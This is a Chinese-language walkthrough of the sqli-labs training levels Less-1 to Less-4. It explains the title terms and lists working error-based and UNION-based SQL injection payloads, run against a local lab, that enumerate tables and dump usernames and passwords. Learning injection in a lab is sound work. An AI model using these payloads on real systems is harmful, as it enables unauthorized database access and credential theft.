# Chapter-1-靶场关卡标题术语解析

Less-1:GET-Error based-Single quotes-String

Less-2:GET-Error based-Intiger based

Less-3:GET-Error based-Single quotes with twist-String

Less-4:GET-Error based-Double quotes-String

> 补充提示：Less-4实际和Less-3类似，带括号变形，标题漏写了with twist。

- **GET**:属于 HTTP 请求方式，参数附加在 URL 地址栏传递。在靶场中代表注入点位于网址参数中，直接修改地址栏即可构造注入测试。

- **Error based**:人为构造存在语法缺陷的 SQL 语句，使数据库返回详细报错信息，借助报错内容提取数据库中的数据。该注入方式依赖网站显示数据库错误。

- **Single/Double quotes**:后台 SQL 用来包裹参数的符号，用来界定字符串边界。我们提交相同的引号，破坏原有 SQL 的引号配对，制造语法错误。

- **String**:后台将输入视为字符串并用引号包裹。注入的必要条件是使用引号完成闭合，才能插入自定义 SQL 语句。

- **Intiger-based**:后台把输入直接作为数字运算，无引号包裹。不需要引号闭合，直接在数字后拼接 SQL 条件即可测试。

- **with twist**:闭合方式不是单纯引号，额外增加括号等符号。Less‑3和Less-4后台带有括号，闭合时需要引号和括号搭配使用。

# Chapter-2-靶场实操完整SQLi流程

## Less-1

后台原始SQL：`SELECT * FROM users WHERE id='$id' LIMIT 0,1;`

注：在真实SQL 注入攻击场景下，无法直接获取后端SQL；本处展示语句仅用于靶场学习，帮助理解注入逻辑。

### 步骤一：访问Less-1首页

访问初始页面(http://localhost/Less-1/)，页面提示输入数字类型的ID参数

![](img/2026-09-09-15-14-49.png)

### 步骤二：传入id参数

传入id参数(http://localhost/Less-1/?id=1),页面回显用户数据，修改 id值(http://localhost/Less-1/?id=2)，页面返回的用户名会同步变化。

![](img/2026-09-09-15-56-29.png)

![](img/2026-09-09-18-17-14.png)

分析：id 参数会交给后台 SQL 查询，查询结果直接展示在页面上，存在 SQL 注入的可能性。

### 步骤三：测试单引号，探测闭合方式

**payload:**`?id=1'`

![](img/2026-09-09-19-47-54.png)

页面返回 MySQL 语法报错，提示单引号数量不匹配。

分析：输入的`'`破坏了原有 SQL 引号配对，证明 id 参数被单引号包裹，属于字符串型注入。后台拼接SQL：`SELECT * FROM users WHERE id='1'' LIMIT 0,1;`

**Payload：** `?id=1' --+`

![](img/2026-09-09-20-28-31.png)

页面恢复正常，再次输出`Welcome Dhakkan`。

分析：`--+` 是SQL注释符号，注释掉后面多余的`' LIMIT 0,1`。

关键结论：我们可以在 `1'` 和 `--+` 之间插入自定义SQL语句，注入点成立！

### 步骤四：Order by 探测查询字段数量

**Payload：** `?id=1' order by 3--+`

![](img/2026-09-09-20-45-58.png)

页面正常回显用户信息。

分析：查询列数≥3

**Payload：** `?id=1' order by 4--+`

![](img/2026-09-09-20-46-37.png)

页面报错。

分析：查询结果一共 **3列**。

### 步骤五：Union联合查询，寻找页面回显位

**Payload：** `?id=-1' union select 1,2,3--+`

![](img/2026-09-09-20-49-38.png)

页面输出数字`2`和`3`。

分析：id=-1，前面查询无匹配结果，页面展示union后面的数据；第2、3列为页面可回显位置，用来输出查询内容。

### 步骤六：查询当前数据库名

**Payload：** `?id=-1' union select 1,database(),version()--+`

![](img/2026-09-09-20-52-30.png)

页面返回数据库名 `security`，MySQL版本号。

分析：`database()`获取当前库名，`version()`获取数据库版本。

### 步骤七：查询security库下所有表名

**Payload：** `?id=-1' union select 1,group_concat(table_name),3 
from information_schema.tables where table_schema='security'--+`

![](img/2026-09-09-20-56-08.png)

页面输出表名集合 `emails,referers,uagents,users`。

分析：users表大概率存储账号密码。

### 步骤八：查询users表的字段名

**Payload：** `?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+`

![](img/2026-09-09-21-00-38.png)

页面返回字段：`id,username,password`。

### 步骤九：爆破users表账号密码数据

**Payload：** `?id=-1' union select 1,group_concat(username),group_concat(password) from security.users--+`

![](img/2026-09-09-21-09-37.png)

页面列出全部用户名和密码。

## Less-2

>前置说明一：Less-2 属于 GET 数字型注入（Integer-based），和 Less-1 字符型单引号注入最大区别：后台把输入直接作为数字运算，无引号包裹。不需要引号闭合，直接在数字后拼接 SQL 条件即可测试。且因为不会产生多余的`'`，所以没有必要使用`--+`注释后面的内容。

>前置说明二：Less-2到Less-4和Less-1属同一类型，基本流程几乎一样，所以只在差别处详细解析，相同处只做简单流程记录。

后台原始SQL:`SELECT * FROM users WHERE id=$id LIMIT 0,1;`

### 步骤一：http://localhost/Less-2/

### 步骤二：http://localhost/Less-2/?id=1

修改 id 参数能够改变页面响应，参数可控，存在注入可能性，但暂时无法确定注入类型，后端可能存在过滤。

### 步骤三：

**Payload：**`?id=1 and 1=1`

![](img/2026-09-10-11-52-56.png)

页面回显与?id=1一致

**payload:**`?id=1 and 1=2`

![](img/2026-09-10-11-53-37.png)

页面无数据返回

分析：直接在 id 数字后拼接布尔条件即可被后端 SQL 解析执行。
如果是字符型注入，未添加闭合引号时，and 关键字会被包裹在引号内作为普通字符串，无法执行。
当前 payload 无需引号闭合即可生效，因此判定为数字型注入，后端原始 SQL 为`id=$id`，id 参数无引号包裹。

>逻辑梳理：步骤二传入不同的id值导致页面回显不同的信息，说明参数id的值会传入后端处理并影响页面结果。但无法直接判定存在注入，后端可能做了过滤、类型强校验（例如只接收数字），非数字内容会被直接丢弃。因此在步骤二的基础上先后测试这两条payload，通过页面回显的差异可以得出结论，在?id=1后面接上别的SQL 条件片段（注入载荷 Payload）是被允许的，且可被读取并识别执行，那么可以说明是数字型。

### 步骤四：
**Payload：**`?id=1 order by 3`

### 步骤五：
**Payload：**`?id=1 order by 4`

### 步骤六：
**Payload：**`?id=-1 union select 1,version(),database()`

### 步骤七：
**Payload：**`?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'`

### 步骤八：
**Payload：**`?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'`

### 步骤九：
**Payload：**`?id=-1 union select 1,group_concat(username),group_concat(password) from users`

## Less-3

后台原始SQL：`SELECT * FROM users WHERE id=('$id') LIMIT 0,1`

>变量$id被单引号和括号包裹

**Payload：**`?id=1') and 1=1 --+`

现象：页面正常，返回 id=1 的数据

**Payload：**`?id=1') and 1=2 --+`

现象：页面无数据返回

>分析：构造` 1') `闭合前面的` ('`，把后面原有单引号和括号提前关掉，后面就可以拼接我们自己的 SQL 语句。直接使用不带闭合的and语句不会生效，必须先构造 ') 完成原有 SQL 的闭合，因此判定为单引号 + 括号变形字符型注入。

**Payload：**`?id=1') order by 3 --+`

**Payload：**`?id=1') order by 4 --+`

**Payload：**`?id=-1') union select 1,version(),database() --+`

**Payload：**`?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+`

**Payload：**`?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+`

**Payload：**`?id=-1') union select 1,group_concat(username),group_concat(password) from users --+`

## Less-4

后台原始SQL：`SELECT * FROM users WHERE id=("$id") LIMIT 0,1`

>变量$id被双引号和括号包裹

**Payload：**`?id=1") and 1=1 --+`

**Payload：**`?id=1") and 1=2 --+`

**Payload：**`?id=1") order by 3 --+`

**Payload：**`?id=1") order by 4 --+`

**Payload：**`?id=-1") union select 1,version(),database() --+`

**Payload：**`?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+`

**Payload：**`?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+`

**Payload：**`?id=-1") union select 1,group_concat(username),group_concat(password) from users --+`